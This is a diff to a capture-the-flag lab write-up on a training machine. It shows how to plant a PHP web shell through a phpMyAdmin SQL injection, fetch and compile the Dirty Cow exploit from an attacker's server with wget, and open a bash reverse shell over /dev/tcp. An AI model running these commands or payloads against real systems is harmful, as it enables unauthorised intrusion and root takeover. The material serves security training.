@@ -1,7 +1,7 @@
 # Dirty Cow in the SQL Injection
 
 In other write-ups, we have seen how to exploit the Dirty Cow vulnerability to gain root access.
-But we needed to have the password of the user `laurie` of the machein to exploit it.
+But we needed to have the password of the user `laurie` of the machine to exploit it.
 
 In this write-up, we will see how compile and run the Dirty Cow exploit without having a ssh connection on the machine, via a SQL Injection in the phpMyAdmin panel.
 
@@ -11,10 +11,16 @@ Like as previous, this is the php code for executing command via the forum page:
 select '<?php system($_GET["cmd"]); ?>' into outfile "/var/www/forum/templates_c/cmd.php"
 ```
 
+We can create a server with python in which our `dirty.c` file will be called.
+
+```bash
+$python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
+```
+
 Now, we can execute any command, first of all we need to send the dirty.c file to the server and compile it:
 
 ```bash
-
 curl --insecure --get https://BornToBeSec/forum/templates_c/cmd.php --data-urlencode "cmd=wget http://attacker:8000/dirty.c 2> /dev/stdout" # Send the dirty.c file from the attacker machine to the server
 curl --insecure --get https://BornToBeSec/forum/templates_c/cmd.php --data-urlencode "cmd=ls" # Check if the file is there
 curl --insecure --get https://BornToBeSec/forum/templates_c/cmd.php --data-urlencode "cmd=gcc -pthread dirty.c -o dirty -lcrypt" # Compile the dirty.c file
@@ -34,5 +40,5 @@ curl --insecure --get https://BornToBeSec/forum/templates_c/cmd.php --data-urlen
 We could also create a reverse shell with the following command:
 ```bash
 nc -lvp 4444 # On the attacker machine
-curl --insecure --get https://BornToBeSec/forum/templates_c/cmd7.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1'" # On the target machine
+curl --insecure --get https://BornToBeSec/forum/templates_c/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" # On the target machine
 ```
